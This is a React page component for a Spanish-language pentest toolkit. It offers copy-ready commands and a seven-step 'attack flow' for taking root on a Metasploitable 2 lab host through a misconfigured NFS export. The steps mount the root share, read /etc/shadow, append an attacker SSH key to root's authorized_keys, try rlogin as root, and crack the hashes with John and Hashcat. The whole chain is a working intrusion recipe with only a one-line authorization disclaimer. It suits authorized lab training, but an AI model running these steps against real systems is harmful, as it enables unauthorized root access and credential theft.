import { useState } from 'react'
import ToolShell from '../components/ToolShell'
import { Copy, Check, Shield, ChevronDown, ChevronUp } from 'lucide-react'

const COLOR = '#22d3ee'

const COMMANDS = [
  {
    cat: '🔍 Reconocimiento NFS/RPC',
    items: [
      { cmd:'rpcinfo 192.168.1.122', desc:'Listar todos los servicios RPC disponibles en el target' },
      { cmd:'showmount -e 192.168.1.122', desc:'Mostrar exports NFS disponibles (sin autenticación)' },
      { cmd:'nmap -sV --script=nfs-ls,nfs-showmount,nfs-statfs 192.168.1.122', desc:'Enumerar NFS con scripts NSE de Nmap' },
    ]
  },
  {
    cat: '🗄️ Montar share NFS',
    items: [
      { cmd:'mkdir -p /home/kali/Desktop/carpetametas2', desc:'Crear directorio de montaje local' },
      { cmd:'mount -t nfs 192.168.1.122:/ /home/kali/Desktop/carpetametas2', desc:'Montar el root del NFS share' },
      { cmd:'mount -t nfs 192.168.1.122:/opt /home/kali/Desktop/carpetametas2', desc:'Montar directorio específico del NFS' },
      { cmd:'ls /home/kali/Desktop/carpetametas2', desc:'Listar contenido del share montado' },
      { cmd:'cat /home/kali/Desktop/carpetametas2/etc/shadow', desc:'Leer /etc/shadow si está montado root (contraseñas hasheadas!)' },
      { cmd:'umount /home/kali/Desktop/carpetametas2', desc:'Desmontar el share NFS al terminar' },
    ]
  },
  {
    cat: '🔑 Escalada via NFS (sin_root_squash)',
    items: [
      { cmd:'ssh-keygen -t rsa -b 2048 -f id_rsa_rsa -N ""', desc:'Generar par de claves SSH sin passphrase' },
      { cmd:'cat id_rsa_rsa.pub >> /home/kali/Desktop/carpetametas2/root/.ssh/authorized_keys', desc:'Añadir clave pública al authorized_keys del ROOT de la máquina target' },
      { cmd:'chmod 700 id_rsa_rsa', desc:'Permisos correctos para la clave privada' },
      { cmd:'ssh -i id_rsa_rsa root@192.168.1.122 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa', desc:'Conectar como root usando la clave privada (legacy ssh-rsa flags para sistemas viejos)' },
      { cmd:'cat /home/kali/Desktop/carpetametas2/root/.ssh/authorized_keys', desc:'Verificar que la clave fue añadida correctamente' },
    ]
  },
  {
    cat: '🚪 rlogin — Acceso legacy sin contraseña',
    items: [
      { cmd:'rlogin -l root 192.168.1.122', desc:'Intentar login como root via rlogin (servicio muy inseguro, Metasploitable lo tiene habilitado)' },
      { cmd:'nmap -p 513 192.168.1.122', desc:'Verificar si el puerto rlogin (513) está abierto' },
    ]
  },
  {
    cat: '🔓 Cracking de /etc/shadow con John',
    items: [
      { cmd:'nano hashes', desc:'Abrir editor — pegar los hashes copiados de /etc/shadow' },
      { cmd:'john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes', desc:'Crackear hashes md5crypt (Linux antiguo) con rockyou.txt' },
      { cmd:'john hashes --show', desc:'Mostrar contraseñas ya crackeadas por John' },
      { cmd:'john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes', desc:'Para hashes SHA-512 (Linux moderno, $6$...)' },
    ]
  },
  {
    cat: '🔑 SSH con clave existente (legacy)',
    items: [
      { cmd:'chmod 700 id_rsa', desc:'Permisos requeridos por SSH para la clave privada' },
      { cmd:'ssh-keygen -y -f id_rsa', desc:'Extraer clave pública desde clave privada' },
      { cmd:'ssh -i id_rsa msfadmin@192.168.1.122 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa', desc:'Conectar con clave privada existente — flags legacy para OpenSSL moderno' },
      { cmd:'ssh -i id_rsa root@192.168.1.122 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa', desc:'Intentar root con la misma clave' },
    ]
  },
  {
    cat: '⚙️ Hashcat — cracking GPU',
    items: [
      { cmd:'hashcat -m 500 hashes /usr/share/wordlists/rockyou.txt', desc:'-m 500 = MD5 (md5crypt) — modo para hashes $1$ de Linux antiguo' },
      { cmd:'hashcat -m 1800 hashes /usr/share/wordlists/rockyou.txt', desc:'-m 1800 = SHA-512 (sha512crypt) — hashes $6$ de Linux moderno' },
      { cmd:'hashcat -m 500 hashes /usr/share/wordlists/rockyou.txt --show', desc:'Mostrar resultados ya crackeados' },
    ]
  },
  {
    cat: '📋 Referencia modos Hashcat comunes',
    items: [
      { cmd:'hashcat --example-hashes | grep -A2 "MODE 500"', desc:'Ver ejemplo de hash md5crypt' },
      { cmd:'# -m 0    → MD5 puro', desc:'' },
      { cmd:'# -m 100  → SHA1', desc:'' },
      { cmd:'# -m 500  → MD5 Linux ($1$)', desc:'' },
      { cmd:'# -m 1000 → NTLM (Windows)', desc:'' },
      { cmd:'# -m 1800 → SHA512 Linux ($6$)', desc:'' },
      { cmd:'# -m 3200 → bcrypt ($2*$)', desc:'' },
      { cmd:'# Ver lista completa: https://hashcat.net/wiki/doku.php?id=hashcat', desc:'' },
    ]
  },
]

function CopyBtn({ text }) {
  const [copied, setCopied] = useState(false)
  const copy = () => {
    if (!text || text.startsWith('#')) return
    navigator.clipboard.writeText(text).then(() => { setCopied(true); setTimeout(()=>setCopied(false),1500) })
  }
  return (
    <button onClick={copy} style={{
      padding:'4px 8px', borderRadius:6, cursor:'pointer', border:'none', transition:'all .15s', flexShrink:0,
      background: copied ? 'rgba(16,185,129,0.2)' : 'rgba(34,211,238,0.12)',
      color: copied ? '#10b981' : '#22d3ee',
    }}>
      {copied ? <Check size={12}/> : <Copy size={12}/>}
    </button>
  )
}

export default function ToolNFS() {
  const [open, setOpen] = useState({})
  const toggle = (cat) => setOpen(o => ({ ...o, [cat]: !o[cat] }))

  return (
    <ToolShell icon="🗄️" name="NFS / RPC / SSH Legacy" color={COLOR} badge="Reconocimiento NFS · Escalada via share · rlogin · Shadow cracking">
      <div style={{ maxWidth:960, margin:'0 auto', padding:'32px 24px' }}>

        <div style={{ display:'flex', gap:8, padding:'11px 14px', borderRadius:9, marginBottom:18,
          background:'rgba(34,211,238,0.08)', border:'1px solid rgba(34,211,238,0.2)',
          color:'rgba(255,255,255,0.5)', fontSize:11, alignItems:'flex-start' }}>
          <Shield size={13} style={{ color:'#22d3ee', flexShrink:0, marginTop:1 }}/>
          <span>Técnicas de explotación de NFS mal configurado. <strong style={{color:'rgba(255,255,255,0.6)'}}>no_root_squash</strong> permite escribir en el sistema de archivos del target con privilegios root desde el atacante. Solo para auditorías autorizadas.</span>
        </div>

        {/* Flujo de ataque */}
        <div style={{ background:'rgba(34,211,238,0.05)', border:'1px solid rgba(34,211,238,0.15)', borderRadius:12, padding:'16px 20px', marginBottom:24 }}>
          <div style={{ color:'#22d3ee', fontWeight:700, fontSize:12, marginBottom:10 }}>🎯 Flujo de ataque NFS → Root (Metasploitable 2)</div>
          <div style={{ display:'flex', flexDirection:'column', gap:6 }}>
            {[
              '1. showmount -e TARGET → ver exports disponibles',
              '2. mount -t nfs TARGET:/ /mnt/nfs → montar root del servidor',
              '3. cat /mnt/nfs/etc/shadow → extraer hashes de contraseñas',
              '4. john --wordlist=rockyou.txt hashes → crackear con diccionario',
              '5. ssh-keygen → generar clave RSA propia',
              '6. cp id_rsa.pub → /mnt/nfs/root/.ssh/authorized_keys → inyectar clave',
              '7. ssh -i id_rsa root@TARGET -o HostKeyAlgorithms=+ssh-rsa → LOGIN ROOT',
            ].map((s,i) => (
              <div key={i} style={{ color:'rgba(255,255,255,0.6)', fontSize:12, fontFamily:'monospace' }}>{s}</div>
            ))}
          </div>
        </div>

        {/* Commands */}
        {COMMANDS.map(cat => (
          <div key={cat.cat} style={{ marginBottom:10, background:'rgba(255,255,255,0.02)', border:'1px solid rgba(255,255,255,0.07)', borderRadius:12, overflow:'hidden' }}>
            <button onClick={()=>toggle(cat.cat)} style={{
              width:'100%', display:'flex', justifyContent:'space-between', alignItems:'center',
              padding:'12px 16px', background:'none', border:'none', cursor:'pointer', color:'rgba(255,255,255,0.7)', fontSize:13, fontWeight:600, textAlign:'left' }}>
              {cat.cat}
              {open[cat.cat] ? <ChevronUp size={14}/> : <ChevronDown size={14}/>}
            </button>
            {open[cat.cat] && (
              <div style={{ padding:'0 12px 12px', display:'flex', flexDirection:'column', gap:8 }}>
                {cat.items.map((item,i) => (
                  <div key={i} style={{ background:'rgba(0,0,0,0.3)', borderRadius:9, padding:'10px 12px' }}>
                    <div style={{ display:'flex', gap:8, alignItems:'flex-start', marginBottom: item.desc ? 6 : 0 }}>
                      <code style={{ flex:1, fontSize:11, color: item.cmd.startsWith('#') ? 'rgba(255,255,255,0.3)' : '#22d3ee', fontFamily:'monospace', lineHeight:1.5 }}>{item.cmd}</code>
                      {!item.cmd.startsWith('#') && <CopyBtn text={item.cmd}/>}
                    </div>
                    {item.desc && <div style={{ color:'rgba(255,255,255,0.4)', fontSize:11 }}>{item.desc}</div>}
                  </div>
                ))}
              </div>
            )}
          </div>
        ))}

      </div>
    </ToolShell>
  )
}
